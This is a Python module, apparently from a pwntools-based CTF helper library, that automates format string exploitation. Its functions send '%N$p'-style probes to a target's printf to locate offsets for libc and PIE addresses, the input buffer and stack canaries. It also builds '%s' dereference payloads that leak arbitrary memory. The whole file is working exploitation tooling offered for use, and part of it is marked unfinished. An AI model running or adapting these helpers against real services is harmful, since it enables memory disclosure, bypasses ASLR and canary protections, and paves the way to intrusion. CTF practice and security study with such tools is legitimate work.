'''For anything that has to do with FSBs'''
'''The whole concept of one-query spamming
should be shafted and replaced with a more
efficient input-length dependent querying
system. For now, though:'''
from pwnscripts.string_checks import *
from typing import Generator
PWNSCRIPT_PRINTF_MIN = 5
PWNSCRIPT_PRINTF_MAX = 35
PWNSCRIPT_PRINTF_OFFSET = None
pack = {'i386': p32, 'amd64': p64}

def _find_printf_offset_generic(requirement):
    def inner(sendprintf, regex=None) -> Generator[tuple, None, None]:
        print(sendprintf)
        for i in range(PWNSCRIPT_PRINTF_MIN, PWNSCRIPT_PRINTF_MAX):
            print(i)
            #%lx here is specific: 32-bit for i386 and 64-bit for amd64
            result = sendprintf('0x%{}$lx\n'.format(i))
            v = extract_first_hex(result)
            if v == -1: continue    #if (nil) or if 
            if requirement(v, regex): yield i
        #implicit raise StopIteration
    return inner

@_find_printf_offset_generic
def find_printf_offset_regex(resp: int, regex: str) -> int:
    '''printf generic to search for a `regex`'''
    return search(regex, hex(resp))
@_find_printf_offset_generic
def find_printf_offset_libc(resp: int, offset: int) -> int:
    '''printf generic for libc addresses. `offset` is optional.
    Provide `offset` to search for a specific offset.'''
    return is_libc_address(resp) and offset_match(resp, offset)
@_find_printf_offset_generic
def find_printf_offset_PIE(resp: int, offset: int) -> int:
    '''printf generic for PIE addresses. `offset` is optional.
    Provide `offset` to search for a specific offset.'''
    return is_PIE_address(resp) and offset_match(resp, offset)

#TODO: EVERYTHING AFTER HERE
def _find_printf_offset_sendprintf(requirement):
    def inner(sendprintf) -> int:
        preserved_log_level = context.log_level
        for i in range(1,PWNSCRIPT_PRINTF_MAX): #note that we're not handling unaligned printf
            context.log_level = 'WARN'  # Patchwork to suppress annoying spam. Not the best solution.
            v = extract_first_hex(sendprintf('A'*8 + '%{}$p\n'.format(i)))
            context.log_level = preserved_log_level
            if context.log_level == 'DEBUG':
                print('pwnscripts: v is %d' % v)
            if v == -1: continue
            if requirement(v):
                log.info('offset for %r: %d' % (requirement.__name__, i))
                return i
        raise RuntimeError
    return inner

@_find_printf_offset_sendprintf
def find_printf_offset_buffer(resp) -> int:
    expected = (0x41414141 if context.arch == 'i386' else 0x4141414141414141)
    return expected == resp
@_find_printf_offset_sendprintf
def find_printf_offset_code(resp) -> int:
    return findall({'i386': '0x804...', 'amd64': '0x40....'}[context.arch], hex(resp)) != []
@_find_printf_offset_sendprintf
def find_printf_offset_canary(resp) -> int:
    '''heuristic to find canary'''
    return resp % 0x100 == 0 and b'\x00' not in pack[context.arch](resp)[1:] and (context.arch == 'amd64' or (lambda b: b < 0xf0 and b != 0x08)(pack[context.arch](resp)[3]))
@_find_printf_offset_sendprintf
def find_printf_offset_stack(resp) -> int:
    if context.arch != 'amd64': raise NotImplementedError
    return findall('0x7ff.........', hex(resp)) != []

# New: helpers for leaking
def leak_printf_deref_payload(buffer_offset: int, addr: list):
    extra = (len(addr)*(3+len(str(buffer_offset))+1)//(context.bits//8)) + 1
    payload = ','.join("%{}$s".format(i) for i in range(buffer_offset+extra, buffer_offset+extra+len(addr))).ljust(extra*context.bits//8,'\x19').encode()
    payload += b''.join(map(pack[context.arch], addr))
    return payload

